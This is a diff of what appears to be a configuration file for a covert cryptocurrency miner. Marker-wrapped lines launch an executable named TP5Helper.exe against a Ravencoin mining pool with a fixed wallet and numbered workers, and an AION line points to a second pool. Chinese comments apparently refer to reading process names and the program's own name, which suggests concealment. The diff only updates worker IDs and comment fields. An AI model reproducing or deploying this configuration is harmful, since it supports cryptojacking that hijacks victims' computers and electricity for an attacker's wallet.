@@ -9,8 +9,8 @@ AA897K.exe8AA
 AA996K.exe9AA
 ------------------------------------------------------------------------------------------------------------------------------------
 A1A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RSkeBNrfmNPzMSxt3tya9MPyU7v7UjXY2b.mr14@pplns -i 14 -p x--A1A
-A2A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RSkeBNrfmNPzMSxt3tya9MPyU7v7UjXY2b.106016on2@pplns -i 16 -p x--A2A
-A3A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RSkeBNrfmNPzMSxt3tya9MPyU7v7UjXY2b.7017on2@pplns -i 17 -p x--A3A
+A2A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RSkeBNrfmNPzMSxt3tya9MPyU7v7UjXY2b.6015@pplns -i 15 -p x--A2A
+A3A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RSkeBNrfmNPzMSxt3tya9MPyU7v7UjXY2b.7016@pplns -i 16 -p x--A3A
 A4A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RSkeBNrfmNPzMSxt3tya9MPyU7v7UjXY2b.W1013@pplns -i 13 -p x--A4A
 A5A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RSkeBNrfmNPzMSxt3tya9MPyU7v7UjXY2b.W1014@pplns -i 14 -p x--A5A
 A6A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RSkeBNrfmNPzMSxt3tya9MPyU7v7UjXY2b.W1015@pplns -i 15 -p x--A6A
@@ -22,10 +22,10 @@ XZ--ON1--XZ
 A0A--\TP5Helper.exe--A0A
 A8A--TP5Helper.exe--A8A---自身
 ------------------------------------------------------------------------------------------------------------------------------------
-B1B--sfdgefggfdgsdrgdfgcxvbdfg--B1B---取名字
-B2B--sfdgefggfdgsdrgdfgcxvbdfg--B2B---取邮名字
-B3B--取取取取取取取取取取--B3B---取邮进程
-B4B--取取取取取取取取取--B4B---取进程
+B1B--sfdgefggfdgsdrgdfgcxvbdfg--B1B---取程
+B2B--sfdgefggfdgsdrgdfgcxvbdfg--B2B---
+B3B--取取取取取取取取取取--B3B---
+B4B--取取取取取取取取取--B4B---
 ------------------------------------------------------------------------------------------------------------------------------------
 AION--  --algo aion --fee 0 --intensity 1 --pec --server cluster.aionpool.tech --port 3333 --user 0xa0e942264d06d6212d3bb1f6a67d4986867a370b47623973f22fa4fb30be905d.98KK --pass x--AION
   ONAI--ON1--ONAI
